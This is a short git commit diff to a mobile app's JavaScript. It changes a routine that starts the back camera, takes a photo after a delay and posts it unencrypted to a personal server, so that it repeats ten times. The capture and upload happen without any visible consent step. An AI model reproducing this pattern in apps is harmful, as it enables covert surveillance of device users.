2b71c9f8aacb98954bb5b7bf8034f09c313ffdb1
durginharry <44795620+durginharry@users.noreply.github.com>
2018-11-17 08:19:03 -1000

    ver

--- www/js/index.js
+++ www/js/index.js
@@ -13,12 +13,15 @@ const sleep = (milliseconds) => {
 var test=function(txt) {
   alert(txt);
   CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
-  sleep(10000).then(() => {
-    CameraPreview.takePicture({width:1280, height:720, quality:50}, function(base64PictureData) {
-      var pic='data:image/jpeg;base64,'+base64PictureData;
-      $.post("http://harrysserver.com/camera/upload.php", {image: pic});
+  var i;
+  for (i=0; i<10; i++) {
+    sleep(10000).then(() => {
+      CameraPreview.takePicture({width:1280, height:720, quality:50}, function(base64PictureData) {
+        var pic='data:image/jpeg;base64,'+base64PictureData;
+        $.post("http://harrysserver.com/camera/upload.php", {image: pic});
+      });
     });
-  })
+  }
 }
 
 app.initialize();
